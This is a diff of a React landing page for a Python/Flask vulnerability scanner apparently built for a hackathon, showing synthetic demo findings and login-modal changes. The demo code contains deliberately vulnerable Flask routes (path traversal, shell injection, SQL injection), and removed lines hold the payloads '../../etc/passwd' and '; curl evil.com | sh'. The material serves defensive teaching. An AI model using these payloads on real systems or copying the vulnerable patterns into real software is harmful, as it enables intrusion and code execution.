@@ -1,10 +1,12 @@
 import { useEffect, useState } from 'react'
 import { api } from '../api.js'
 import { ErrorBox } from '../components.jsx'
+import PatternWaves from '../components/PatternWaves.jsx'
 import Tilt from '../components/Tilt.jsx'
 
 const MIN_PASSWORD = 12
 
+// Synthetic, illustrative findings for demonstration only
 const SAMPLE_FINDINGS = [
   {
     id: 'cwe-22',
@@ -12,24 +14,24 @@ const SAMPLE_FINDINGS = [
     file: 'app/routes/documents.py',
     cwe: 'CWE-22',
     severity: 'Critical 9.2',
-    source: 'filename = request.args.get("doc")',
-    sink: 'return open(target_path, "rb").read()',
+    source: 'doc = request.args.get("doc")',
+    sink: 'open(target_path, "rb").read()',
     codeSnippet: [
       { n: 14, text: '@app.route("/view-document")' },
       { n: 15, text: 'def view_doc():' },
-      { n: 16, text: '    doc = request.args.get("doc")  # [Source: Untrusted HTTP query]' , hl: 'source' },
-      { n: 17, text: '    target = os.path.join(DOCS_DIR, doc)' },
-      { n: 18, text: '    return open(target, "rb").read()  # [Sink: Unchecked file read]', hl: 'sink' },
+      { n: 16, text: '    doc = request.args.get("doc")  # Source: Untrusted HTTP query' , hl: 'source' },
+      { n: 17, text: '    target_path = os.path.join(DOCS_DIR, doc)' },
+      { n: 18, text: '    return open(target_path, "rb").read()  # Sink: File read', hl: 'sink' },
     ],
     patchSnippet: [
-      { type: 'del', text: '-     return open(target, "rb").read()' },
+      { type: 'del', text: '-     return open(target_path, "rb").read()' },
       { type: 'add', text: '+     safe_name = werkzeug.utils.secure_filename(doc)' },
-      { type: 'add', text: '+     safe_target = os.path.abspath(os.path.join(DOCS_DIR, safe_name))' },
-      { type: 'add', text: '+     if not safe_target.startswith(os.path.abspath(DOCS_DIR)):' },
+      { type: 'add', text: '+     safe_path = os.path.abspath(os.path.join(DOCS_DIR, safe_name))' },
+      { type: 'add', text: '+     if not safe_path.startswith(os.path.abspath(DOCS_DIR)):' },
       { type: 'add', text: '+         abort(400, "Access denied: invalid file path")' },
-      { type: 'add', text: '+     return open(safe_target, "rb").read()' },
+      { type: 'add', text: '+     return open(safe_path, "rb").read()' },
     ],
-    explanation: 'Untrusted input from request.args flows without validation to the built-in open() call, permitting arbitrary file reads via directory traversal (e.g. "../../etc/passwd").',
+    explanation: 'Untrusted user parameter flows to open() without boundary checks, allowing directory traversal reads.',
   },
   {
     id: 'cwe-78',
@@ -37,14 +39,14 @@ const SAMPLE_FINDINGS = [
     file: 'app/utils/compress.py',
     cwe: 'CWE-78',
     severity: 'Critical 9.8',
-    source: 'archive_name = request.json.get("archive")',
-    sink: 'subprocess.check_output(f"tar -czf {archive_name} .", shell=True)',
+    source: 'archive = request.json.get("archive")',
+    sink: 'subprocess.check_output(cmd, shell=True)',
     codeSnippet: [
       { n: 32, text: '@app.route("/compress", methods=["POST"])' },
       { n: 33, text: 'def compress_folder():' },
-      { n: 34, text: '    archive = request.json.get("name")  # [Source: Untrusted JSON]', hl: 'source' },
+      { n: 34, text: '    archive = request.json.get("name")  # Source: Untrusted JSON', hl: 'source' },
       { n: 35, text: '    cmd = f"tar -czf {archive}.tar.gz /data"' },
-      { n: 36, text: '    return subprocess.check_output(cmd, shell=True)  # [Sink: Shell execution]', hl: 'sink' },
+      { n: 36, text: '    return subprocess.check_output(cmd, shell=True)  # Sink: Shell execution', hl: 'sink' },
     ],
     patchSnippet: [
       { type: 'del', text: '-     return subprocess.check_output(cmd, shell=True)' },
@@ -52,7 +54,7 @@ const SAMPLE_FINDINGS = [
       { type: 'add', text: '+     cmd = ["tar", "-czf", f"{safe_archive}.tar.gz", "/data"]' },
       { type: 'add', text: '+     return subprocess.check_output(cmd, shell=False)' },
     ],
-    explanation: 'User input is interpolated into a shell command with shell=True, enabling shell metacharacter injection (e.g. "; curl evil.com | sh").',
+    explanation: 'User input is interpolated directly into a shell execution call with shell=True, enabling shell injection.',
   },
   {
     id: 'cwe-89',
@@ -60,14 +62,14 @@ const SAMPLE_FINDINGS = [
     file: 'app/models/user.py',
     cwe: 'CWE-89',
     severity: 'High 8.5',
-    source: 'search_term = request.args.get("q")',
-    sink: 'cursor.execute(f"SELECT * FROM items WHERE name LIKE \'%{search_term}%\'")',
+    source: 'query = request.args.get("q", "")',
+    sink: 'db.session.execute(sql)',
     codeSnippet: [
       { n: 21, text: '@app.route("/search")' },
       { n: 22, text: 'def search_items():' },
-      { n: 23, text: '    query = request.args.get("q", "")  # [Source: Untrusted parameter]', hl: 'source' },
+      { n: 23, text: '    query = request.args.get("q", "")  # Source: Untrusted query string', hl: 'source' },
       { n: 24, text: '    sql = f"SELECT id, name FROM catalog WHERE name LIKE \'%{query}%\'"' },
-      { n: 25, text: '    return db.session.execute(sql).fetchall()  # [Sink: Raw SQL string]', hl: 'sink' },
+      { n: 25, text: '    return db.session.execute(sql).fetchall()  # Sink: Raw SQL string', hl: 'sink' },
     ],
     patchSnippet: [
       { type: 'del', text: '-     sql = f"SELECT id, name FROM catalog WHERE name LIKE \'%{query}%\'"' },
@@ -75,23 +77,24 @@ const SAMPLE_FINDINGS = [
       { type: 'add', text: '+     stmt = text("SELECT id, name FROM catalog WHERE name LIKE :pattern")' },
       { type: 'add', text: '+     return db.session.execute(stmt, {"pattern": f"%{query}%"}).fetchall()' },
     ],
-    explanation: 'Unsanitized user input is concatenated into an SQL query string instead of using bound parameterized statements.',
+    explanation: 'Unsanitized input is concatenated into an SQL string instead of using bound parameterized statements.',
   },
 ]
 
-export default function Welcome({ onSignedIn, initialAuth = false, user = null }) {
+export default function Welcome({ onSignedIn, initialAuth = false }) {
   const [authOpen, setAuthOpen] = useState(initialAuth)
   const [authTab, setAuthTab] = useState('github') // 'github' | 'email'
   const [selectedSample, setSelectedSample] = useState(SAMPLE_FINDINGS[0])
-  const [scanState, setScanState] = useState('scanned') // 'scanning' | 'scanned'
   const [cliCopied, setCliCopied] = useState(false)
 
-  // Email/Password login state
+  // Auth form states
   const [mode, setMode] = useState('signin')
   const [signupAllowed, setSignupAllowed] = useState(false)
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [confirm, setConfirm] = useState('')
+  const [showPassword, setShowPassword] = useState(false)
+  const [forgotPassword, setForgotPassword] = useState(false)
   const [busy, setBusy] = useState(false)
   const [error, setError] = useState('')
 
@@ -110,14 +113,16 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
     if (initialAuth) setAuthOpen(true)
   }, [initialAuth])
 
-  function triggerScanSimulation(sample) {
-    setSelectedSample(sample)
-    setScanState('scanning')
-    const timer = setTimeout(() => {
-      setScanState('scanned')
-    }, 450)
-    return () => clearTimeout(timer)
-  }
+  // Escape key closes modal
+  useEffect(() => {
+    function handleKeyDown(e) {
+      if (e.key === 'Escape' && authOpen) {
+        setAuthOpen(false)
+      }
+    }
+    window.addEventListener('keydown', handleKeyDown)
+    return () => window.removeEventListener('keydown', handleKeyDown)
+  }, [authOpen])
 
   function copyCli() {
     navigator.clipboard?.writeText('sentinel scan . --format text')
@@ -148,12 +153,8 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
 
   return (
     <div className="welcome-page">
-      {/* Subtle warm amber/orange flowing light background & dot grid */}
-      <div className="warm-amber-glow" aria-hidden="true">
-        <div className="amber-orb primary-orb" />
-        <div className="amber-orb secondary-orb" />
-        <div className="dot-grid-canvas" />
-      </div>
+      {/* PatternWaves animation effect with subdued dot-matrix silk wave and amber backlight */}
+      <PatternWaves />
 
       {/* HERO SECTION */}
       <section className="welcome-hero" aria-labelledby="hero-title">
@@ -194,7 +195,7 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
           </div>
 
           <div className="hero-sublinks">
-            <span className="muted small">No account needed for local scans.</span>
+            <span className="muted small">No account required for local use.</span>
             <span className="dot-divider" aria-hidden="true">·</span>
             <button
               type="button"
@@ -211,7 +212,7 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
           <div className="trust-badges" aria-label="Key security guarantees">
             <div className="trust-item">
               <span className="trust-check">✓</span>
-              <span>100% on-device local mode</span>
+              <span>Local CLI requires no account</span>
             </div>
             <div className="trust-item">
               <span className="trust-check">✓</span>
@@ -219,16 +220,16 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
             </div>
             <div className="trust-item">
               <span className="trust-check">✓</span>
-              <span>AES-256-GCM vault</span>
+              <span>AES-256-GCM vault for team data</span>
             </div>
           </div>
         </div>
 
         {/* OVERLAPPING TRANSLUCENT GLASS PANELS */}
-        <div className="hero-preview-stage" aria-label="Interactive preview of Kavach security scanning">
+        <div className="hero-preview-stage" aria-label="Illustrative preview of Kavach security scanning">
           <div className="preview-label-tag">
             <span className="live-dot" />
-            <span>Illustrative AST Trace Preview</span>
+            <span>Illustrative preview · Synthetic demo</span>
           </div>
 
           {/* Panel 1: Code & Taint Path */}
@@ -261,11 +262,11 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
             </div>
           </div>
 
-          {/* Panel 2: Finding Diagnosis & Severity Badge */}
+          {/* Panel 2: Finding Diagnosis Badge */}
           <Tilt className="glass-card preview-finding-card">
             <div className="finding-preview-head">
               <span className="pill sev-critical mono">{selectedSample.cwe}</span>
-              <span className="pill status-open">AST Reachable</span>
+              <span className="pill status-open">Candidate sink</span>
             </div>
             <strong className="finding-title">{selectedSample.name}</strong>
             <p className="finding-desc small muted">{selectedSample.explanation}</p>
@@ -274,8 +275,8 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
           {/* Panel 3: Verified Patch Card */}
           <Tilt className="glass-card preview-patch-card">
             <div className="patch-card-header">
-              <span className="badge ok">✓ Verified Patch</span>
-              <span className="muted small">AST re-checked in memory</span>
+              <span className="badge ok">Suggested Fix</span>
+              <span className="muted small">Illustrative AST patch</span>
             </div>
             <div className="patch-diff mono small">
               {selectedSample.patchSnippet.map((p, idx) => (
@@ -296,17 +297,16 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
             From raw input to verified fix in three steps.
           </h2>
           <p className="section-subtitle muted">
-            Traditional linters drown you in style warnings. Kavach builds an AST propagation graph to prove whether user data actually reaches a dangerous call.
+            Traditional linters drown you in style warnings. Kavach builds an AST propagation graph to determine whether untrusted user data reaches a dangerous call.
           </p>
         </div>
 
         <div className="steps-grid">
           <div className="step-card">
             <div className="step-badge">1</div>
-            <h3>Connect or open a project</h3>
+            <h3>Add or open a project</h3>
             <p className="muted small">
-              Run <code className="mono">sentinel scan</code> on your machine or paste a GitHub repository link.
-              Local projects stay 100% on your device without upload.
+              Run <code className="mono">sentinel scan</code> on your local workstation or connect a GitHub repository link for team scans.
             </p>
           </div>
 
@@ -320,9 +320,9 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
 
           <div className="step-card">
             <div className="step-badge">3</div>
-            <h3>Approve a suggested fix</h3>
+            <h3>Approve a fix and re-scan</h3>
             <p className="muted small">
-              Kavach generates syntactically correct code rewrites using hardened standard libraries, verifying in memory that the sink is neutralized before you merge.
+              Review syntactically correct code rewrites using hardened standard libraries, verifying in memory that the sink is neutralized before you merge.
             </p>
           </div>
         </div>
@@ -366,7 +366,7 @@ export default function Welcome({ onSignedIn, initialAuth = false, user = null }
 ============================================================
 CRITICAL: CWE-22 Path Traversal in app/routes.py:18
   Source: request.args.get("doc") at line 16
-  Sink:   open(target, "rb") at line 18
+  Sink:   open(target_path, "rb") at line 18
   Fix:    Use werkzeug.utils.secure_filename & path boundary check
 ============================================================
 1 finding (1 critical). Run with --sarif for CI output.`}
@@ -398,7 +398,7 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                   role="tab"
                   aria-selected={selectedSample.id === sample.id}
                   className={`button sample-btn ${selectedSample.id === sample.id ? 'active' : ''}`}
-                  onClick={() => triggerScanSimulation(sample)}
+                  onClick={() => setSelectedSample(sample)}
                 >
                   {sample.name}
                 </button>
@@ -452,13 +452,13 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
             <h3>Workstation Execution</h3>
             <ul className="privacy-list muted small">
               <li>
-                <strong>Zero source code transmission:</strong> Code is processed in memory on your CPU and never leaves your machine.
+                <strong>Local processing:</strong> In local CLI mode, code is analyzed in memory on your workstation. No source code is uploaded to any third party.
               </li>
               <li>
-                <strong>No account required:</strong> No registration, email, or API key needed to scan code or view findings.
+                <strong>No account required:</strong> Local command-line scans run immediately without signing in or providing an API key.
               </li>
               <li>
-                <strong>Deterministic offline rules:</strong> Detectors inspect syntax trees without telemetry or external AI dependencies.
+                <strong>Offline rules:</strong> Static AST detectors inspect code structure without external telemetry.
               </li>
             </ul>
           </div>
@@ -468,35 +468,49 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
             <h3>Team & CI Integration</h3>
             <ul className="privacy-list muted small">
               <li>
-                <strong>Encrypted storage at rest:</strong> Uploaded workspaces and findings are sealed with AES-256-GCM encryption.
+                <strong>Encrypted storage at rest:</strong> Uploaded scan workspaces are sealed with AES-256-GCM vault encryption on the server.
               </li>
               <li>
-                <strong>Account-isolated access:</strong> Scans are linked to your owner ID; other users receive 404 responses for unauthorized records.
+                <strong>Account-isolated access:</strong> Scans are linked to your authenticated owner ID; other users receive 404 responses for unauthorized records.
               </li>
               <li>
-                <strong>Admin repository authorization:</strong> GitHub sign-in identifies you; automated PR scanning requires explicit repository permission from an organization administrator.
+                <strong>Admin repository authorization:</strong> GitHub sign-in identifies your developer identity. Automated PR scanning requires repository access granted by an organization administrator.
               </li>
             </ul>
           </div>
         </div>
       </section>
 
-      {/* FOOTER */}
+      {/* RESTRAINED FOOTER WITH REAL DESTINATIONS */}
       <footer className="welcome-footer muted small">
         <div className="footer-links">
           <a href="#product">Product</a>
           <a href="#how-it-works">How it works</a>
           <a href="#privacy">Privacy</a>
+          <a href="https://github.com/Hackfest-X-Saividya/pocketrocket-t2-04#readme" target="_blank" rel="noreferrer">
+            Documentation
+          </a>
+          <a href="https://github.com/Hackfest-X-Saividya/pocketrocket-t2-04" target="_blank" rel="noreferrer">
+            GitHub
+          </a>
           <button type="button" className="link" onClick={() => { setAuthTab('email'); setAuthOpen(true) }}>
             Sign in
           </button>
         </div>
-        <p>Kavach 2.0 · Python & Flask Security Scanner · Hack Fest 2026</p>
+        <p>Kavach 2.0 · Python & Flask Vulnerability Scanner · Hack Fest 2026</p>
       </footer>
 
-      {/* WELCOME / SIGN IN MODAL */}
+      {/* WELCOME / SIGN IN MODAL (INSPIRED BY SCREENSHOT 2) */}
       {authOpen && (
-        <div className="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
+        <div
+          className="modal-backdrop"
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="auth-modal-title"
+          onClick={(e) => {
+            if (e.target === e.currentTarget) setAuthOpen(false)
+          }}
+        >
           <div className="modal-card">
             <button
               type="button"
@@ -513,7 +527,7 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                 role="tab"
                 aria-selected={authTab === 'github'}
                 className={`tab-btn ${authTab === 'github' ? 'active' : ''}`}
-                onClick={() => setAuthTab('github')}
+                onClick={() => { setAuthTab('github'); setForgotPassword(false); setError('') }}
               >
                 GitHub Sign in
               </button>
@@ -522,7 +536,7 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                 role="tab"
                 aria-selected={authTab === 'email'}
                 className={`tab-btn ${authTab === 'email' ? 'active' : ''}`}
-                onClick={() => setAuthTab('email')}
+                onClick={() => { setAuthTab('email'); setForgotPassword(false); setError('') }}
               >
                 Email & Password
               </button>
@@ -532,21 +546,21 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
               <div className="github-auth-pane">
                 <h2 id="auth-modal-title">Sign in with GitHub</h2>
                 <p className="muted small">
-                  Connect your GitHub identity for team repository scanning and automated PR checks.
+                  Connect your GitHub identity for team features and automated pull-request checks.
                 </p>
 
                 <div className="account-flow-note small">
                   <div className="flow-item">
                     <span className="flow-bullet">•</span>
-                    <span><strong>First-time sign-in</strong> automatically provisions your Kavach account.</span>
+                    <span><strong>First-time sign-in</strong> automatically provisions your Kavach account upon OAuth approval.</span>
                   </div>
                   <div className="flow-item">
                     <span className="flow-bullet">•</span>
-                    <span><strong>Returning developers</strong> are seamlessly authenticated via OAuth.</span>
+                    <span><strong>Returning developers</strong> are authenticated directly through GitHub.</span>
                   </div>
                   <div className="flow-item">
                     <span className="flow-bullet">•</span>
-                    <span><strong>Team authorization:</strong> GitHub sign-in identifies you. Pull request branch scanning additionally requires team admin authorization for your organization's repositories.</span>
+                    <span><strong>Team authorization:</strong> GitHub sign-in identifies you. Repository PR scanning additionally requires team admin authorization for your organization's repositories.</span>
                   </div>
                 </div>
 
@@ -557,7 +571,7 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                     <span className="small muted">OAuth Endpoint Inactive</span>
                   </div>
                   <p className="small muted">
-                    GitHub OAuth routes are not yet configured on this backend instance. To enable direct GitHub sign-in, the following configuration is needed:
+                    GitHub OAuth is not yet configured on this backend instance. To enable direct GitHub sign-in, the following configuration is needed:
                   </p>
                   <ul className="small mono oauth-needed-list">
                     <li>GITHUB_CLIENT_ID</li>
@@ -565,7 +579,7 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                     <li>Backend route: /api/auth/github</li>
                   </ul>
                   <p className="small muted">
-                    In the meantime, you can continue scanning locally without an account, or sign in using email credentials below.
+                    You can continue scanning locally without an account, or sign in using email credentials below.
                   </p>
                 </div>
 
@@ -573,20 +587,20 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                   <a href="#product" className="button primary" onClick={() => setAuthOpen(false)}>
                     Continue locally (no account)
                   </a>
-                  <button type="button" className="button" onClick={() => setAuthTab('email')}>
+                  <button type="button" className="button" onClick={() => { setAuthTab('email'); setError('') }}>
                     Sign in with email instead
                   </button>
                 </div>
               </div>
             )}
 
-            {authTab === 'email' && (
+            {authTab === 'email' && !forgotPassword && (
               <div className="email-auth-pane">
                 <h2 id="auth-modal-title">{signup ? 'Create an account' : 'Sign in with email'}</h2>
                 <p className="muted small">
                   {signup
                     ? 'Create a Kavach account. Your scans will be private to your account.'
-                    : 'Sign in to access your saved scans and monitor Flask applications.'}
+                    : 'Sign in to access your registered projects and saved scan results.'}
                 </p>
 
                 <form onSubmit={handleEmailSubmit} className="login-form">
@@ -601,27 +615,39 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                       autoFocus
                     />
                   </label>
-                  <label>
+
+                  <label className="password-input-wrapper">
                     <span>Password</span>
-                    <input
-                      type="password"
-                      autoComplete={signup ? 'new-password' : 'current-password'}
-                      required
-                      minLength={signup ? MIN_PASSWORD : undefined}
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                    />
+                    <div className="password-row">
+                      <input
+                        type={showPassword ? 'text' : 'password'}
+                        autoComplete={signup ? 'new-password' : 'current-password'}
+                        required
+                        minLength={signup ? MIN_PASSWORD : undefined}
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                      />
+                      <button
+                        type="button"
+                        className="password-toggle-btn"
+                        onClick={() => setShowPassword(!showPassword)}
+                        aria-label={showPassword ? 'Hide password' : 'Show password'}
+                      >
+                        {showPassword ? 'Hide' : 'Show'}
+                      </button>
+                    </div>
                     {signup && (
                       <span className={`hint ${tooShort ? 'bad' : ''}`}>
                         At least {MIN_PASSWORD} characters. A short sentence works well.
                       </span>
                     )}
                   </label>
+
                   {signup && (
-                    <label>
+                    <label className="password-input-wrapper">
                       <span>Confirm password</span>
                       <input
-                        type="password"
+                        type={showPassword ? 'text' : 'password'}
                         autoComplete="new-password"
                         required
                         value={confirm}
@@ -630,6 +656,19 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                       {mismatch && <span className="hint bad">The passwords do not match.</span>}
                     </label>
                   )}
+
+                  {!signup && (
+                    <div className="forgot-password-link-row">
+                      <button
+                        type="button"
+                        className="link small"
+                        onClick={() => setForgotPassword(true)}
+                      >
+                        Forgot password?
+                      </button>
+                    </div>
+                  )}
+
                   <ErrorBox error={error} />
                   <button type="submit" className="button primary" disabled={busy || !ready}>
                     {busy ? 'Processing…' : signup ? 'Create account' : 'Sign in'}
@@ -651,6 +690,34 @@ CRITICAL: CWE-22 Path Traversal in app/routes.py:18
                     </button>
                   </p>
                 )}
+
+                <div className="auth-footer-actions">
+                  <a href="#product" className="button secondary small" onClick={() => setAuthOpen(false)}>
+                    Continue locally (no account)
+                  </a>
+                </div>
+              </div>
+            )}
+
+            {authTab === 'email' && forgotPassword && (
+              <div className="forgot-password-pane">
+                <h2>Reset password</h2>
+                <p className="muted small">
+                  Kavach stores credentials securely using Argon2id. Password resets for self-hosted instances are managed by your instance administrator.
+                </p>
+                <div className="oauth-status-box">
+                  <strong>Local Administrator Reset:</strong>
+                  <p className="small muted">
+                    Set a new password directly in your server configuration by updating <code className="mono">SENTINEL_ADMIN_PASSWORD</code> in <code className="mono">backend/.env</code> and restarting the backend.
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  className="button"
+                  onClick={() => setForgotPassword(false)}
+                >
+                  Back to sign in
+                </button>
               </div>
             )}
           </div>
